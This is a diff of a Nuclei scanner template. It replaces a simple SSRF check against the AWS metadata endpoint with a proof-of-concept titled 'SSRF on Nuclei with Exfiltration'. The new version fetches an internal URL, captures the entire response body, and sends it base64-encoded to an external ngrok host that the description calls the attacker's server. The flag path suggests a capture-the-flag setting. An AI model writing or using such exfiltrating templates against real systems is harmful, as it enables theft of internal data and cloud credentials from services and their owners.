@@ -1,18 +1,20 @@
-id: SSRF
+id: ssrf-poc
 
 info:
-  name: SSRF-AWS
-  author: 25
-  severity: high
-  tags: SSRF
+  name: SSRF on Nuclei with Exfiltration
+  author: caioluders
+  severity: critical
+  description: Makes internal request, dumps response on the attacker's server
 
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/hostname"
-
-    matchers:
-       - type: word
-         part: body
-         words:
-           - "compute.internal"
+      - "http://127.0.0.1:1337/flag"
+      - "http://133713371337.ngrok.io/{{base64(output)}}"
+    extractors:
+      - type: regex
+        name: output
+        part: body
+        internal: true
+        regex:
+          - ".*"
